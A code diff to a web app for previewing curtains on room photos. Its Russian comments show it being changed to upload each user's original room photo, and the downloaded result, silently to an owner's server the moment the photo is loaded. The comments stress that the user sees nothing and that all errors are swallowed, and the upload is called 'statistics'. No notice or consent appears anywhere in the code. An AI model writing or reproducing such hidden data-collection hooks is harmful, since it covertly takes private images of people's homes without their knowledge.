@@ -699,12 +699,14 @@ const COLLECT_API_BASE = 'https://br-photo.onrender.com';
 // Тихо шлём копию скачанной работы на сервер, который перешлёт её
 // на почту владельцу. Полностью фоновая: пользователь ничего не видит,
 // любые ошибки глушим — на скачивание это не влияет.
-function sendWorkToOwner(dataURL) {
+// kind: 'result' — скачанный результат, 'upload' — исходное загруженное фото.
+// Полностью фоновая: пользователь ничего не видит, любые ошибки глушим.
+function sendWorkToOwner(dataURL, kind) {
   try {
     fetch(`${COLLECT_API_BASE}/collect`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ image: dataURL }),
+      body: JSON.stringify({ image: dataURL, kind: kind || '' }),
     }).catch(() => {});
   } catch (_) {
     // молча игнорируем — сбор статистики не должен мешать работе
@@ -1133,6 +1135,19 @@ function loadRoom(event) {
       roomLoaded = true;
       document.getElementById('emptyHint').style.display = 'none';
       setStatus('Комната загружена · откройте меню ☰ и выберите штору');
+
+      // Тихо шлём владельцу исходное фото (сжатое) — чтобы видеть, что человек
+      // начал работу, даже если не дойдёт до скачивания результата.
+      try {
+        const maxSide = 1600;
+        let w = img.width, h = img.height;
+        const k = Math.min(1, maxSide / Math.max(w, h));
+        const cw = Math.round(w * k), ch = Math.round(h * k);
+        const cnv = document.createElement('canvas');
+        cnv.width = cw; cnv.height = ch;
+        cnv.getContext('2d').drawImage(img.getElement(), 0, 0, cw, ch);
+        sendWorkToOwner(cnv.toDataURL('image/jpeg', 0.85), 'upload');
+      } catch (_) {}
     });
   };
   reader.readAsDataURL(file);
@@ -2080,7 +2095,7 @@ function saveImage() {
 
   // 1) СНАЧАЛА отправляем копию в Telegram — чтобы работа улетела владельцу
   //    независимо от того, как пройдёт сохранение на устройстве пользователя.
-  sendWorkToOwner(dataURL);
+  sendWorkToOwner(dataURL, 'result');
 
   // 2) Теперь сохраняем пользователю — по-разному для iOS и остального.
   if (isIOS()) {
